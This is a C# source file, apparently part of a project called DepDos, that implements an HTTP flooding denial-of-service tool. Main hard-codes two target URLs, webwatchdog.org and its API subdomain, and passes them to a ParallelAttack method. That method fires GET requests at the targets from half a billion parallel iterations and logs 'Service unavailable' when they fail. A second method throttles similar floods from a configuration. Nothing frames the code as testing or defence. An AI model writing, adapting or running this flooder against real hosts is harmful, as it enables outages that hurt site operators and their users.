using System;
using System.Net;
using DepDos.Core.Interfaces;

namespace MyApp
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string siteApi = "https://webwatchdog.org";
            string backendApi = "https://api.webwatchdog.org/";
            HttpClient client = new HttpClient();
            var requestUrl = siteApi;
            ParallelAttack(new List<string>
            {
                siteApi,
                backendApi
            }, client);
        }

        static async void ParallelAttack(List<string> requestUrls, HttpClient client)
        {
            List<int> taskCount = new List<int>();
            for(int i = 0; i < 500000000; i++)
                taskCount.Add(i);
            Parallel.ForEach(taskCount, res =>
            {
                Console.WriteLine($"PublisherThread Started: [{res}]");
                try
                {
                    foreach(var link in requestUrls)
                        client.GetAsync(link);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"Task Closed without error [{res}]");
                    Console.ForegroundColor = ConsoleColor.White;
                }
                catch (Exception e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Service unavailable at Task [{res}] with ex [{e.StackTrace}]");
                    Console.ForegroundColor = ConsoleColor.White;
                }
            });
        }
        private async Task ProcessRequestAsync(HttpClient client, IDosConfiguration configuration)
        {
            Console.WriteLine($"PublisherThread Started: [{configuration.Name}]");

            try
            {
                var requests = configuration.Urls.Select(url => client.GetAsync(url));
                var tasks = new List<Task>();

                foreach (var request in requests)
                {
                    if (tasks.Count < configuration.ParallelismLimit)
                    {
                        tasks.Add(request);
                    }
                    else
                    {
                        await Task.WhenAny(tasks);
                        tasks.RemoveAll(t => t.IsCompleted);
                        tasks.Add(request);
                    }
                }

                await Task.WhenAll(tasks);
            
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"Task Closed without error [{configuration.Name}]");
            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Service unavailable at Task [{configuration.Name}] with ex [{e}]");
            }
            finally
            {
                Console.ForegroundColor = ConsoleColor.White;
            }
        }
    }
}